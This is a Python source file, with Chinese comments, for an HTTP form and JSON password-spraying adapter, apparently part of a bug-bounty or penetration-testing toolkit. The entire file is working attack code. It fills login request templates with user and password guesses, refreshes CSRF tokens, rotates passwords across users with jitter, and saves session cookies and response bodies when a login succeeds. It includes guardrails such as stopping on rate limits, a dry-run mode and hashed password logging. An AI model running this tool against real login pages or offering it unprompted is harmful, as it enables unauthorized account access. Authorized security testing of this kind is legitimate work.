#!/usr/bin/env python3
"""HTTP form/JSON Spray 适配器；由 spray_orchestrator.sh 调用。"""

from __future__ import annotations

import http.cookiejar
import json
import os
import random
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from pathlib import Path
from typing import Any

try:
    from tools.spray_contract import (
        append_attempt,
        build_ssl_context as _ssl_context,
        finish_run,
        insecure_enabled as _insecure_enabled,
        prepare_run,
        write_private_json,
    )
except ImportError:  # pragma: no cover - 支持直接运行 tools 脚本
    from spray_contract import (
        append_attempt,
        build_ssl_context as _ssl_context,
        finish_run,
        insecure_enabled as _insecure_enabled,
        prepare_run,
        write_private_json,
    )


USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"
MAX_RESPONSE_BYTES = 64 * 1024
ALLOWED_PLACEHOLDERS = {"USER", "USERNAME", "PASS", "PASSWORD", "CSRF"}
PLACEHOLDER_RE = re.compile(r"\{([A-Z_]+)\}")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def _load_json_object(path: Path) -> dict[str, Any]:
    try:
        payload = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise ValueError(f"invalid request spec: {path}: {exc}") from exc
    if not isinstance(payload, dict):
        raise ValueError("request spec must be a JSON object")
    return payload


def _legacy_spec() -> dict[str, Any]:
    post_data = os.environ.get("SPRAY_POST_DATA") or "username={USER}&password={PASS}"
    pairs = urllib.parse.parse_qsl(post_data, keep_blank_values=True)
    if not pairs:
        raise ValueError("legacy --post-data must contain form fields")
    body: dict[str, str] = {}
    for key, value in pairs:
        if key in body:
            raise ValueError("legacy --post-data cannot represent duplicate form fields; use --request-spec")
        body[key] = value
    spec: dict[str, Any] = {
        "schema_version": 1,
        "method": "POST",
        "url": os.environ.get("SPRAY_TARGET_URL", ""),
        "headers": {},
        "body_format": "form",
        "body": body,
        "success": {},
        "failure": {},
        "guard": {"status_codes": [429]},
    }
    csrf_regex = os.environ.get("SPRAY_CSRF_EXTRACT", "")
    if csrf_regex:
        spec["csrf"] = {
            "url": os.environ.get("SPRAY_TARGET_URL", ""),
            "regex": csrf_regex,
            "refresh": "per-attempt",
        }
    if os.environ.get("SPRAY_SUCCESS_REGEX"):
        spec["success"]["body_regex"] = os.environ["SPRAY_SUCCESS_REGEX"]
    if os.environ.get("SPRAY_FAIL_REGEX"):
        spec["failure"]["body_regex"] = os.environ["SPRAY_FAIL_REGEX"]
    return spec


def _walk_strings(value: Any):
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for item in value.values():
            yield from _walk_strings(item)
    elif isinstance(value, list):
        for item in value:
            yield from _walk_strings(item)


def _compile_optional(value: Any, *, label: str) -> re.Pattern[str] | None:
    if value in (None, ""):
        return None
    if not isinstance(value, str):
        raise ValueError(f"{label} must be a string")
    try:
        return re.compile(value, re.IGNORECASE)
    except re.error as exc:
        raise ValueError(f"invalid {label}: {exc}") from exc


def load_request_spec() -> dict[str, Any]:
    path = os.environ.get("SPRAY_REQUEST_SPEC", "").strip()
    spec = _load_json_object(Path(path)) if path else _legacy_spec()
    if spec.get("schema_version") != 1:
        raise ValueError("request spec schema_version must be 1")
    if str(spec.get("method", "POST")).upper() != "POST":
        raise ValueError("request spec method must be POST")
    target_url = os.environ.get("SPRAY_TARGET_URL", "")
    request_url = str(spec.get("url") or target_url)
    if request_url != target_url:
        raise ValueError("request spec url must match the CLI target URL")
    parsed = urllib.parse.urlparse(request_url)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise ValueError("request spec url must be a valid http/https URL")
    spec["url"] = request_url

    body_format = spec.get("body_format")
    if body_format not in {"form", "json"}:
        raise ValueError("request spec body_format must be form or json")
    body = spec.get("body")
    if not isinstance(body, dict) or not body:
        raise ValueError("request spec body must be a non-empty object")
    if body_format == "form" and any(isinstance(value, (dict, list)) for value in body.values()):
        raise ValueError("form body values must be scalar")

    headers = spec.get("headers") or {}
    if not isinstance(headers, dict) or any(not isinstance(k, str) or not isinstance(v, str) for k, v in headers.items()):
        raise ValueError("request spec headers must be a string map")
    if any(key.lower() in {"host", "content-length"} for key in headers):
        raise ValueError("request spec cannot override Host or Content-Length")
    spec["headers"] = headers

    placeholders = {
        match.group(1)
        for value in _walk_strings({"headers": headers, "body": body})
        for match in PLACEHOLDER_RE.finditer(value)
    }
    unknown = placeholders - ALLOWED_PLACEHOLDERS
    if unknown:
        raise ValueError(f"unknown request placeholders: {', '.join(sorted(unknown))}")
    if not placeholders.intersection({"USER", "USERNAME"}):
        raise ValueError("request body/headers must contain {USER} or {USERNAME}")
    if not placeholders.intersection({"PASS", "PASSWORD"}):
        raise ValueError("request body/headers must contain {PASS} or {PASSWORD}")

    success = spec.get("success") or {}
    failure = spec.get("failure") or {}
    guard = spec.get("guard") or {}
    if not all(isinstance(value, dict) for value in (success, failure, guard)):
        raise ValueError("success, failure, and guard must be objects")
    compiled = {
        "success_body": _compile_optional(success.get("body_regex"), label="success.body_regex"),
        "success_redirect": _compile_optional(success.get("redirect_regex"), label="success.redirect_regex"),
        "failure_body": _compile_optional(failure.get("body_regex"), label="failure.body_regex"),
        "guard_body": _compile_optional(guard.get("body_regex"), label="guard.body_regex"),
    }
    cookie_name = success.get("cookie_name")
    if cookie_name not in (None, "") and not isinstance(cookie_name, str):
        raise ValueError("success.cookie_name must be a string")
    if not any((compiled["success_body"], compiled["success_redirect"], cookie_name, compiled["failure_body"])):
        raise ValueError("request spec needs an explicit success or failure signal")

    status_codes = guard.get("status_codes", [429])
    if not isinstance(status_codes, list) or any(not isinstance(code, int) or not 100 <= code <= 599 for code in status_codes):
        raise ValueError("guard.status_codes must be a list of HTTP status integers")
    guard["status_codes"] = sorted(set(status_codes) | {429})
    spec["success"], spec["failure"], spec["guard"] = success, failure, guard

    csrf = spec.get("csrf")
    if csrf is not None:
        if not isinstance(csrf, dict):
            raise ValueError("csrf must be an object")
        csrf_url = str(csrf.get("url") or request_url)
        csrf_parsed = urllib.parse.urlparse(csrf_url)
        if csrf_parsed.scheme not in {"http", "https"} or not csrf_parsed.hostname:
            raise ValueError("csrf.url must be a valid http/https URL")
        csrf_re = _compile_optional(csrf.get("regex"), label="csrf.regex")
        if csrf_re is None or csrf_re.groups < 1:
            raise ValueError("csrf.regex must contain a capture group")
        if csrf.get("refresh", "per-attempt") != "per-attempt":
            raise ValueError("csrf.refresh currently supports only per-attempt")
        csrf["url"] = csrf_url
        csrf["refresh"] = "per-attempt"
    if "CSRF" in placeholders and not csrf:
        raise ValueError("{CSRF} placeholder requires a csrf object")
    if csrf and "CSRF" not in placeholders:
        raise ValueError("csrf object requires a {CSRF} placeholder")

    spec["_compiled"] = compiled
    return spec


def _binding_spec(spec: dict[str, Any]) -> dict[str, Any]:
    return {
        "request_spec": {key: value for key, value in spec.items() if key != "_compiled"},
        "tls_verify": not _insecure_enabled(),
    }


def _request_shape(spec: dict[str, Any]) -> dict[str, Any]:
    success = spec["success"]
    return {
        "method": "POST",
        "url": spec["url"],
        "body_format": spec["body_format"],
        "header_names": sorted(spec["headers"]),
        "body_fields": sorted(spec["body"]),
        "csrf": bool(spec.get("csrf")),
        "success_signals": sorted(key for key, value in success.items() if value),
        "failure_signal": bool(spec["failure"].get("body_regex")),
        "guard_status_codes": spec["guard"]["status_codes"],
        "tls_verify": not _insecure_enabled(),
    }


def _substitute(value: Any, *, user: str, password: str, csrf: str) -> Any:
    substitutions = {
        "{USER}": user,
        "{USERNAME}": user,
        "{PASS}": password,
        "{PASSWORD}": password,
        "{CSRF}": csrf,
    }
    if isinstance(value, str):
        for key, replacement in substitutions.items():
            value = value.replace(key, replacement)
        return value
    if isinstance(value, dict):
        return {key: _substitute(item, user=user, password=password, csrf=csrf) for key, item in value.items()}
    if isinstance(value, list):
        return [_substitute(item, user=user, password=password, csrf=csrf) for item in value]
    return value


def _build_opener(jar: http.cookiejar.CookieJar) -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        NoRedirect,
        urllib.request.HTTPSHandler(context=_ssl_context()),
    )


def _read_response(opener: urllib.request.OpenerDirector, request: urllib.request.Request) -> dict[str, Any]:
    started = time.monotonic()
    try:
        with opener.open(request, timeout=15) as response:
            return {
                "status_code": response.status,
                "headers": dict(response.headers.items()),
                "body": response.read(MAX_RESPONSE_BYTES).decode("utf-8", errors="replace"),
                "redirect_to": "",
                "duration_ms": int((time.monotonic() - started) * 1000),
            }
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read(MAX_RESPONSE_BYTES).decode("utf-8", errors="replace")
        except OSError:
            body = ""
        return {
            "status_code": exc.code,
            "headers": dict(exc.headers.items()) if exc.headers else {},
            "body": body,
            "redirect_to": exc.headers.get("Location", "") if exc.headers else "",
            "duration_ms": int((time.monotonic() - started) * 1000),
        }
    except (OSError, urllib.error.URLError, TimeoutError) as exc:
        return {
            "status_code": 0,
            "headers": {},
            "body": "",
            "redirect_to": "",
            "duration_ms": int((time.monotonic() - started) * 1000),
            "error": type(exc).__name__,
        }


def _fetch_csrf(opener: urllib.request.OpenerDirector, spec: dict[str, Any]) -> tuple[str, str]:
    csrf = spec.get("csrf")
    if not csrf:
        return "", ""
    request = urllib.request.Request(csrf["url"], headers={"User-Agent": USER_AGENT})
    result = _read_response(opener, request)
    if result.get("error"):
        return "", "network_error"
    match = re.search(csrf["regex"], result["body"], re.IGNORECASE)
    if not match:
        return "", "csrf_unavailable"
    return match.group(1), ""


def _safe_redirect(value: str) -> str:
    if not value:
        return ""
    parsed = urllib.parse.urlparse(value)
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))


def _attempt(
    spec: dict[str, Any],
    opener: urllib.request.OpenerDirector,
    jar: http.cookiejar.CookieJar,
    user: str,
    password: str,
) -> dict[str, Any]:
    csrf, csrf_error = _fetch_csrf(opener, spec)
    if csrf_error:
        return {
            "classification": "network_error" if csrf_error == "network_error" else "guarded",
            "credential_valid": None,
            "status_code": 0,
            "duration_ms": 0,
            "error_kind": csrf_error,
            "body": "",
            "headers": {},
            "redirect_to": "",
        }

    body_value = _substitute(spec["body"], user=user, password=password, csrf=csrf)
    headers = {
        "User-Agent": USER_AGENT,
        **_substitute(spec["headers"], user=user, password=password, csrf=csrf),
    }
    if spec["body_format"] == "form":
        body_bytes = urllib.parse.urlencode(body_value).encode("utf-8")
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    else:
        body_bytes = json.dumps(body_value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    request = urllib.request.Request(spec["url"], data=body_bytes, headers=headers, method="POST")
    cookies_before = {cookie.name: cookie.value for cookie in jar}
    result = _read_response(opener, request)
    if result.get("error"):
        classification, credential_valid = "network_error", None
    else:
        compiled = spec["_compiled"]
        guard_match = result["status_code"] in spec["guard"]["status_codes"] or bool(
            compiled["guard_body"] and compiled["guard_body"].search(result["body"])
        )
        cookie_name = spec["success"].get("cookie_name")
        cookie_match = bool(
            cookie_name
            and any(
                cookie.name == cookie_name
                and cookie.value
                and cookies_before.get(cookie.name) != cookie.value
                for cookie in jar
            )
        )
        success_match = bool(
            (compiled["success_body"] and compiled["success_body"].search(result["body"]))
            or (compiled["success_redirect"] and compiled["success_redirect"].search(result["redirect_to"]))
            or cookie_match
        )
        failure_match = bool(
            compiled["failure_body"] and compiled["failure_body"].search(result["body"])
        )
        if guard_match:
            classification, credential_valid = "rate_limited" if result["status_code"] == 429 else "guarded", None
        elif success_match:
            classification, credential_valid = "valid_session", True
        elif failure_match:
            classification, credential_valid = "invalid_credentials", False
        else:
            classification, credential_valid = "ambiguous_candidate", None
    return {
        **result,
        "classification": classification,
        "credential_valid": credential_valid,
    }


def main() -> int:
    context = None
    counters: Counter[str] = Counter()
    try:
        spec = load_request_spec()
        context = prepare_run(
            "http-form",
            config_binding=_binding_spec(spec),
            request_shape=_request_shape(spec),
        )
        counters.update(context.existing_counts or {})
        if context.dry_run:
            print(f"[+] Preflight: {context.preflight_path}")
            print(f"[+] {len(context.users)} users × {len(context.passwords)} passwords; network attempts=0")
            return 0

        jars = {user: http.cookiejar.CookieJar() for user in context.users}
        openers = {user: _build_opener(jars[user]) for user in context.users}
        valid_users = set(context.valid_users or set())
        consecutive_network_errors = 0
        stop_reason = "completed"
        status = "completed"

        for round_index, password in enumerate(context.passwords, 1):
            attempted_this_round = False
            for user in context.users:
                if user in valid_users:
                    continue
                attempt_key = context.attempt_key(user, password)
                if attempt_key in (context.completed_attempts or set()):
                    continue
                attempted_this_round = True
                result = _attempt(spec, openers[user], jars[user], user, password)
                classification = result["classification"]
                counters[classification] += 1
                append_attempt(
                    context,
                    {
                        "tool": "builtin",
                        "round": round_index,
                        "user": user,
                        "pwd_sha256_prefix": attempt_key.rsplit("\0", 1)[1],
                        "attempt_key": attempt_key,
                        "classification": classification,
                        "credential_valid": result["credential_valid"],
                        "token_issued": False,
                        "status_code": result["status_code"],
                        "duration_ms": result["duration_ms"],
                        "redirect_to": _safe_redirect(result.get("redirect_to", "")),
                        "error_kind": result.get("error_kind") or result.get("error"),
                    },
                )

                if classification in {"valid_session", "ambiguous_candidate"}:
                    write_private_json(
                        context,
                        f"response-{sum(counters.values()):06d}.json",
                        {
                            "user": user,
                            "pwd_sha256_prefix": attempt_key.rsplit("\0", 1)[1],
                            "classification": classification,
                            "status_code": result["status_code"],
                            "headers": result.get("headers", {}),
                            "body": result.get("body", ""),
                            "cookies": {cookie.name: cookie.value for cookie in jars[user]},
                        },
                    )
                if classification == "valid_session":
                    valid_users.add(user)

                if classification == "network_error":
                    consecutive_network_errors += 1
                else:
                    consecutive_network_errors = 0

                if classification in {"rate_limited", "guarded", "ambiguous_candidate"}:
                    stop_reason, status = classification, "stopped"
                    raise StopIteration
                if consecutive_network_errors >= 3:
                    stop_reason, status = "network_error_threshold", "stopped"
                    raise StopIteration
                if classification == "valid_session" and not context.continue_on_hit:
                    stop_reason, status = "credential_valid", "stopped"
                    raise StopIteration

            if attempted_this_round and round_index < len(context.passwords):
                wait = max(0, context.delay + random.randint(-context.jitter, context.jitter))
                time.sleep(wait)

        finish_run(context, status=status, stop_reason=stop_reason, counters=dict(counters), exit_code=0)
        print(f"[+] Summary: {context.summary_path}")
        return 0
    except StopIteration:
        assert context is not None
        finish_run(context, status=status, stop_reason=stop_reason, counters=dict(counters), exit_code=0)
        print(f"[+] Summary: {context.summary_path}")
        return 0
    except KeyboardInterrupt:
        if context is not None and not context.dry_run:
            finish_run(context, status="interrupted", stop_reason="sigint", counters=dict(counters), exit_code=130)
        return 130
    except (OSError, ValueError) as exc:
        if context is not None and not context.dry_run:
            finish_run(context, status="error", stop_reason="tool_error", counters=dict(counters), exit_code=2)
        print(f"http-form adapter error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
